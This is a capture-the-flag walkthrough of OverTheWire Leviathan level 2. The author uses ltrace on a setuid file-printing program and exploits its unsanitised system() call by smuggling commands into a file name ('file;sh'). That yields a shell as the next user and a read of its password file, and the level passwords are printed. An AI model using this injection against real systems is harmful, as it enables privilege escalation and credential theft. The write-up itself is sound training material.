# Leviathan 2


## Overview

-----------------
On the OverTheWire/Leviathan website, we are told how connecting to the bandit server as a specific user works.

Each user corresponds to a different level:
- Leviathan0 -> Level 0
- Leviathan1 -> Level 1
- ...
- Leviathan33 -> Level 33

Each level is hiding a flag, which is used as the password for the following level. Meaning, one must solve `Level n` to play `Level n+1`.

We always start out connecting to the `leviathan.labs.overthewire.org` server on `port 2223` for each level.
Again, the users on the server specifies the level. Each starting point is the same:

``` text
➜  ~  ssh leviathan0@leviathan.labs.overthewire.org -p 2223          
                   _            _       _   _                        
                  | | _____   _(_) __ _| |_| |__   __ _ _ __         
                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \        
                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |       
                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|       
                                                                     
                                                                     
                      This is an OverTheWire game server.            
            More information on http://www.overthewire.org/wargames  
                                                                     
leviathan0@leviathan.labs.overthewire.org's password:     
```

The password will always be the flag of the previous level. With the exception of Level 0, where the password is `leviathan0`.


## Connecting

--------------

We can establish a connection with the server via ssh, and using the password `mEh5PNl10e`:

``` text
➜  ~  ssh leviathan2@leviathan.labs.overthewire.org -p 2223
                   _            _       _   _                 
                  | | _____   _(_) __ _| |_| |__   __ _ _ __  
                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \ 
                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |
                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|
                                                              

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

leviathan2@leviathan.labs.overthewire.org's password: mEh5PNl10e

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

<snip>

  Enjoy your stay!

leviathan2@gibson:~$ 
```

## Looking Around

--------------
We first start by looking around the home directory, as we have no idea what is going on. We will use the command `ls`,
which allows us to `list` the content of the current directory (or specified directory).


``` text
leviathan2@gibson:~$ ls 
printfile
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

Alright let's check out how the `printfile` works using the `ltrace` command.

``` text

```

``` text
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.coxd7AqHmP
leviathan2@gibson:~$ cd /tmp/tmp.coxd7AqHmP
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$ touch file.txt
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$ ltrace ~/printfile file.txt 
__libc_start_main(0x80491e6, 2, 0xffffd5a4, 0 <unfinished ...>
access("file.txt", 4)                                                                   = 0
snprintf("/bin/cat file.txt", 511, "/bin/cat %s", "file.txt")                           = 17
geteuid()                                                                               = 12002
geteuid()                                                                               = 12002
setreuid(12002, 12002)                                                                  = 0
system("/bin/cat file.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                  = 0
+++ exited (status 0) +++
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$ ltrace ~/printfile file2.txt 
__libc_start_main(0x80491e6, 2, 0xffffd5a4, 0 <unfinished ...>
access("file2.txt", 4)                                                                  = -1
puts("You cant have that file..."You cant have that file...
)                                                      = 27
+++ exited (status 1) +++
```

Okay. Apparently the function `access()` checks if the file exists and then passes it on through the program.

If we do give it a good file (existing file), the program makes a system call using `cat` on the filename to print the
file.

After being stuck for a while, I realized that the `system()` function treats its contents like a terminal. So, 
we can create a "command" as a file name to be passed into the `system()` function.

``` text
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$ ltrace ~/printfile "file;pwd" 
__libc_start_main(0x80491e6, 2, 0xffffd5a4, 0 <unfinished ...>
access("file;pwd", 4)                                                                   = 0
snprintf("/bin/cat file;pwd", 511, "/bin/cat %s", "file;pwd")                           = 17
geteuid()                                                                               = 12002
geteuid()                                                                               = 12002
setreuid(12002, 12002)                                                                  = 0
system("/bin/cat file;pwd"/bin/cat: file: No such file or directory
/tmp/tmp.coxd7AqHmP
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                  = 0
+++ exited (status 0) +++
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$
```

As we can see it worked. We got the `pwd` (print working directory) used as a command. Now, what if we create a shell
and escelate our privilieges to use commands as `leviathan3`?


``` text
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$ touch "file;sh"
leviathan2@gibson:/tmp/tmp.coxd7AqHmP$ ~/printfile "file;sh" 
/bin/cat: file: Permission denied
$ whoami
leviathan3
$ cat /etc/leviathan_pass/leviathan3
Q0G8j4sakn
$     
```

We created a file names `file;sh` in the hopes that the `system()` function creates a shell for us to use. And it actually
did create a shell for us. We tested it with the `whoami` command, and we got `leviathan3` as the answer. Now, we can execute
the `cat /etc/leviathan_pass/leviathan3` to print the password for `leviathan3`. And we got the password. HELL YEAH.



